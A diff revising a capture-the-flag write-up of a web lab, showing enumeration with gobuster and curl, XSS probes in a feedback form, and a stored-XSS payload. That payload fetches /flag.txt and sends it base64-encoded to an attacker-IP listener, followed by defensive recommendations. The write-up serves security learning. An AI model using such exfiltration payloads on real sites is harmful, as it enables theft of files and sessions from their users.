@@ -1,14 +1,16 @@
-I beging with the next room 
+## Initial Enumeration
+
+I started the assessment by reviewing the information provided in the room description.
 
 <img width="755" height="306" alt="image" src="https://github.com/user-attachments/assets/f155c47b-5e90-4d59-8a9c-7f25e69aa115" />
 
 We have the IP and the only clue "http://10.80.158.20:8080/flag.txt"
 
-If we enter in the IP we don't have access to the flag
+Accessing the provided URL directly returned a 401 Unauthorized response, indicating that the resource was protected.
 
 <img width="498" height="216" alt="image" src="https://github.com/user-attachments/assets/f5dd1fc6-9c10-4540-8fa8-af3f100829d9" />
 
-It's not as easy as it seems.
+This suggests that direct access to /flag.txt is restricted and another attack vector is required.
 
 Then, we delete /flag.txt in the URL, we got the kitty shop (sticker shop)
 
@@ -18,7 +20,7 @@ Use gobuster to enumerate the ip, with a little lucky we can find hidden directo
 
 <img width="559" height="309" alt="image" src="https://github.com/user-attachments/assets/17ca952c-ae60-405b-8d14-213d5735ea63" />
 
-Note: In the end, it's not useful
+Although directory enumeration did not reveal anything directly useful, it helped confirm that no obvious hidden endpoints were exposed.
 
 While gobuster ir running, we go to check aroung the page 
 
@@ -34,13 +36,16 @@ I try to change the method GET to POST
 
 <img width="477" height="182" alt="image" src="https://github.com/user-attachments/assets/30932aa5-b660-4346-ae5d-e1afdd407b1f" />
 
-We get a new error: "405 Method Not Allowed"
-
-Ok, what's happen if we add the -i option? 
+The server responded with "405 Method Not Allowed" when attempting a POST request
 
 <img width="491" height="293" alt="image" src="https://github.com/user-attachments/assets/30d4e5ae-6648-43a1-9fcd-625b9fff75a5" />
 
-We get the methods allowed, OPTIONS, HEAD and GET
+By adding the -i flag in curl, the response headers revealed the allowed HTTP methods:
+
+- OPTIONS
+- HEAD
+- GET
+This indicates that the endpoint only supports read-based interactions.
 
 Then, we use the HEAD method
 
@@ -61,11 +66,15 @@ We send a "feedback" for test
 
 We have success to send the test message
 But, where to went?
-Try a XSS
+At this stage, I began testing for Cross-Site Scripting (XSS) vulnerabilities in the feedback form.
+
+Initial payloads such as:
+
+"<script>alert(1)</script>"
 
 <img width="370" height="196" alt="image" src="https://github.com/user-attachments/assets/fc0b36b5-9af7-43ef-a94c-767e8d176182" />
 
-We don't get the alert
+did not execute, suggesting possible filtering or output encoding
 
 <img width="609" height="394" alt="image" src="https://github.com/user-attachments/assets/28b1ca66-566e-4b91-b313-ff911c6e4202" />
 
@@ -84,12 +93,9 @@ We can try a XSS with the textarea, </textarea><script>alert('SeraByte');</scrip
 
 <img width="362" height="125" alt="image" src="https://github.com/user-attachments/assets/6b0ef981-baeb-4005-82b5-d16aeecf268c" />
 
-But nothing again
-We try another XSS
   &lt img src=x onerror=alert(1)>
   ">&ltimg src=x onerror=alert(1)>
 
-We don't have success
 What happend if we try a reverse shell? 
 We run a listener 
 
@@ -100,29 +106,30 @@ We run a listener
 
 <img width="310" height="104" alt="image" src="https://github.com/user-attachments/assets/83aaa2aa-1183-4828-847c-64df5485c842" />
 
-Ok We recibe a non-shell, just are the request the server, like a curl
+This confirmed the presence of a stored XSS vulnerability and suggested that an automated review bot was processing submitted feedback messages.
 
 <img width="441" height="221" alt="image" src="https://github.com/user-attachments/assets/f85b7107-4d27-4805-99a7-e9230b188f8b" />
 
+After submitting test payloads, I noticed that while no alert executed in my browser, the server interacted with my external listener when an image payload was submitted.
 Now we are sure that it's a stored XSS, and there's a bot checking for the messages
 We need a script to do the bot get us the flag
 
-We can use the next
+To exploit the stored XSS, I crafted a payload to retrieve the protected resource:
+
 "<script>
 fetch('/flag.txt')
-.then(r => r.text())
-.then(data => {
-  fetch('http://<IP>:443/?flag=' + btoa(data))
-})
-</script>"
+  .then(response => response.text())
+  .then(data => {
+    fetch('http://<ATTACKER-IP>:443/?flag=' + btoa(data))
+  });
+</script>
 
-"&ltimg src=x onerror=" ... ">" We call a imagen that not exists
+Explanation:
 
-"fetch('/flag.txt')"    We call the flag.txt
-
-".then(r=>r.text())"    Fetch() returns a promise, r is the request, .text convert the string in plaintext
-
-btoa(data)              Encode the data in base64, why? for not brek the output
+- fetch('/flag.txt') requests the protected file from the server.
+- response.text() converts the response into plaintext.
+- btoa(data) encodes the content in Base64 to ensure safe transmission.
+- The second fetch() sends the encoded data to my listener.
 
 
 We start the listener, and submit the script 
@@ -139,11 +146,19 @@ Using a simple command, like "echo <string-base64> | base64 -d" we can get the f
 <img width="675" height="84" alt="image" src="https://github.com/user-attachments/assets/0014af9e-0555-46a3-b405-826a52d1d922" />
 
 
-Security Impact
-This vulnerability demonstrates how stored XSS combined with an admin review bot can lead to privilege escalation and data exfiltration.
+## Security Impact
 
-Defensive Considerations
-- Proper output encoding
-- Content Security Policy
-- Input sanitization
-- Avoid rendering user-controlled HTML
+This vulnerability demonstrates how a stored XSS combined with an automated admin bot can result in unauthorized data access and sensitive information disclosure.
+
+An attacker could leverage this to:
+- Steal sensitive files
+- Hijack authenticated sessions
+- Perform actions on behalf of privileged users
+
+## Defensive Recommendations
+
+- Implement proper output encoding to prevent HTML injection.
+- Use a strict Content Security Policy (CSP).
+- Sanitize and validate user input.
+- Avoid rendering unsanitized user-controlled HTML.
+- Isolate automated review bots in restricted environments.
